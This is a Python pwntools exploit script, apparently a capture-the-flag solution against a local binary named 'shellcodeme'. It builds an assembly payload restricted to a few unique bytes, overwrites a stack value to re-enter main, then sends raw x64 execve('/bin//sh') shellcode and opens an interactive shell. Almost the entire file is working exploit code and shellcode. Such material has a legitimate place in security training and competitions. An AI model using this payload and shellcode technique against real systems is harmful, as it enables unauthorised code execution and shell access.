from pwn import *
context.arch = "amd64"

debug = False
if debug:
  context.log_level = "debug"

inc = 'inc eax\n'
two = 'add eax, eax\n'

# double and add rax to hit the target value
def build_it_up(target):
  start = 0xa # rax starts at 0xa

  assembly = ''
  rax = start

  # Use binary repr. of target to decide when to add 1
  bin_repr = str(bin(target))
  assert bin_repr.startswith('0b1000000000')

  # First increment rax to 0x107 for mov trick
  diff = 0x107 - rax
  assembly += (diff * inc)
  rax += diff
  assert rax == 0x107
  assembly += 'mov BYTE PTR[rsp + rax], 240\n'

  # Then increment rax to 0x200
  diff = 0x200 - rax
  assembly += (diff * inc)
  rax += diff
  assert rax == 0x200

  # Now, double and add the rest of the way to the target
  # The first 12 bits are already set because we're at 0x200
  after = bin_repr[12:]

  for c in after:
    assembly += two
    rax *= 2
    if c == '1':
      assembly += inc
      rax += 1
  assert rax == target
  assembly += 'jmp rax\n'
  return assembly

# count number of unique bytes in assembly snippet
def count_unique(assembly):
  return len(set(asm(assembly)))

# standard x64 shellcode; cheaper and more reliable than pwntool's default
shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"

# Address to return to after first call
redo_addr = 0x40069b # after repz stoz

# Our first payload: jump back in the middle of main, but first set `seen[257]` to some large value
payload = build_it_up(redo_addr)
print('{} unique'.format(count_unique(payload))) # uses all 7 unique bytes

# Let's do this:
p = process('./shellcodeme')

if debug:
  gdb.attach(p, '''
set disassembly-flavor intel
set height 0
display/10i $pc
b *0x0000000000400712
display/ub ($rsp + 0x107)
''')

p.recvuntil('Shellcode?\n')
p.sendline(asm(payload))

# Now, send some real shellcode
p.recvuntil('Shellcode?\n')
p.sendline(shellcode)

# Win
p.interactive()
